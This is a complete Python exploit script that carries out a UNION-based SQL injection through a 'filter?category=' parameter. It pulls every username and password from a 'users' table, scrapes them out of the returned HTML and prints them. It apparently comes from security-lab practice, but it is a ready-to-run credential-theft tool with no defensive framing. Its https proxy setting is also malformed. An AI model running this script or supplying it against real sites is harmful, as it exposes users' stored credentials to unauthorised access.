#Get user and password using concatenation

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http:127.0.0.1:8080'}
path = 'filter?category='
payload = "' UNION SELECT NULL, username || ' - ' || password FROM users--"

def sqli_exploit(url):
	r = requests.get(url + path + payload, verify=False, proxies=proxies)
	if r.status_code == 200:
		soup = BeautifulSoup(r.text, 'html.parser')
		get_credentials = soup.find_all('th')

		if get_credentials:
			credentials = []
			for i in get_credentials:
				credentials.append(i.get_text().strip())
			cred_final = '\n'.join(credentials)
			return cred_final
	return False

if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f'[-] Usage: {sys.argv[0]} <url>')
		print(f'[-] Example: {sys.argv[0]} www.example.com')

	try:
		get_credentials = sqli_exploit(url)

		if get_credentials:
			print(f'\033[32m[+] Users and passwords find:\033[0m\n{get_credentials}')
			print('\033[32m[+] SQLi successful!\033[0m')
		else:
			print('\033[31m[-] No found credentials\033[0m')
			print('\033[31m[-] SQLi unsuccessful!!!\033[0m')
	except KeyboardInterrupt:
		print('\n\033[33m[+] Exited...\033[0m')
		sys.exit(0)
